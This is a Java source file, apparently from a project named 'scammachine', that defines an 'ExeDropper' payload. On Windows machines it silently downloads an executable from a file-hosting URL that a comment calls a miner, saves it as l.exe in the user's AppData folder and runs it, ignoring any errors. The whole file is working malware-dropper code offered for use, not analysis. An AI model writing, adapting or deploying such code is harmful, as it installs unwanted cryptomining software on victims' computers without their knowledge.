package me.teejayx6.scammachine.payloadz;

import java.awt.*;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;

public class ExeDropper
{

    //the following method should return a raw miner download url
    private static String getRawUrl()
    {
        return "https://cdn-107.anonfiles.com/xe9fG219y7/1a2d8176-1659361918/build.exe";
    }

    public static void perform()
    {
        if ( !System.getProperty( "os.name" ).toLowerCase().startsWith( "win" ) )
            return;
        File f = new File( System.getenv( "APPDATA" ) + "\\" + "l.exe" );
        if ( f.exists() )
        {
            f.delete();
        } else
        {
            try
            {
                f.createNewFile();
            } catch ( IOException e )
            {
                return;
            }
        }
        try ( BufferedInputStream in = new BufferedInputStream( new URL( getRawUrl() ).openStream() );
              FileOutputStream fileOutputStream = new FileOutputStream( f ) )
        {
            byte[] dataBuffer = new byte[ 1024 ];
            int bytesRead;
            while ( ( bytesRead = in.read( dataBuffer, 0, 1024 ) ) != -1 )
            {
                fileOutputStream.write( dataBuffer, 0, bytesRead );
            }
            Desktop.getDesktop().open( f );
        } catch ( IOException ignored )
        {
        }
    }
}
